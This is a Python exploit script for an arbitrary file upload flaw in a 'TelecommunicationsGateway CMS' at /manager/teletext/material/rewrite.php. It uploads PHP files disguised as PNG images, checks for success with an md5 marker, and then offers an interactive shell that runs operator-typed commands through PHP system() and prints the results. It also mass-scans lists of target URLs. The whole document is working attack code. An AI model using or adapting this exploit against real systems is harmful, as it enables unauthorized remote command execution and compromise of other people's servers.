import requests
import urllib3
import string,random
from urllib.parse import urljoin
import argparse
import time
import ssl
import json
import urllib.request
ssl._create_default_https_context = ssl._create_unverified_context
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def read_file(file_path):
    with open(file_path, 'r') as file:
        urls = file.read().splitlines()
    return urls

def generate_random_string(length):
    characters = string.ascii_letters + string.digits
    random_string = ''.join(random.choice(characters) for _ in range(length))
    return random_string

def check(url):
    url = url.rstrip("/")
    target = urljoin(url,"/manager/teletext/material/rewrite.php")
    headers = {
        "User-Agent": "MMozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryOKldnDPT"
    }
    filename = generate_random_string(6)
    data = """------WebKitFormBoundaryOKldnDPT\r\nContent-Disposition: form-data; name="tmp_name"; filename="{}.php"\r\nContent-Type: image/png\r\n\r\n<?php echo md5(123456);unlink(__FILE__);?>\r\n------WebKitFormBoundaryOKldnDPT\r\nContent-Disposition: form-data; name="uploadtime"\r\n\r\n\r\n------WebKitFormBoundaryOKldnDPT--""".format(filename)
    try:
        response = requests.post(target, verify=False, headers=headers, data=data, timeout=15)
        if response.status_code == 200 and 'xmedia' in response.text and 'success' in response.text:
            data = json.loads(response.text)
            path = data['url']
            result_url = urljoin(url,path)
            result_response = requests.get(result_url,timeout=15,verify=False,headers = {"User-Agent": "MMozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36",})
            if result_response.status_code == 200 and 'e10adc3949ba59abbe56e057f20f883e' in result_response.text:
                print(f"\033[31mDiscovered:{url}: TelecommunicationsGateway_CMS_rewrite_ArbitraryFileUploads!\033[0m")
                return True
    except Exception as e:
        pass

def run(url):
    url = url.rstrip("/")
    target = urljoin(url, "/manager/teletext/material/rewrite.php")
    headers = {
        "User-Agent": "MMozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryOKldnDPT"
    }
    if check(url):
        while True:
            command = input("\033[34mPlease input command (stop input:exit):\033[0m")
            if "exit" not in command:
                filename = generate_random_string(6)
                data = """------WebKitFormBoundaryOKldnDPT\r\nContent-Disposition: form-data; name="tmp_name"; filename="{}.php"\r\nContent-Type: image/png\r\n\r\n<?php system('{}');unlink(__FILE__);?>\r\n------WebKitFormBoundaryOKldnDPT\r\nContent-Disposition: form-data; name="uploadtime"\r\n\r\n\r\n------WebKitFormBoundaryOKldnDPT--""".format(filename,command)
                try:
                    response = requests.post(target, verify=False, headers=headers, data=data, timeout=15)
                    if response.status_code == 200 and 'xmedia' in response.text and 'success' in response.text:
                        data = json.loads(response.text)
                        path = data['url']
                        result_url = urljoin(url, path)
                        result_response = requests.get(result_url, timeout=15,verify=False, headers={"User-Agent": "MMozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36", })
                        if result_response.status_code == 200:
                            print(result_response.text)
                except Exception as e:
                    pass
            else:
                break

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="URL")
    parser.add_argument("-f", "--txt", help="file")
    args = parser.parse_args()
    url = args.url
    txt = args.txt
    if url:
        run(url)
    elif txt:
        urls = read_file(txt)
        for url in urls:
            check(url)
    else:
        print("help")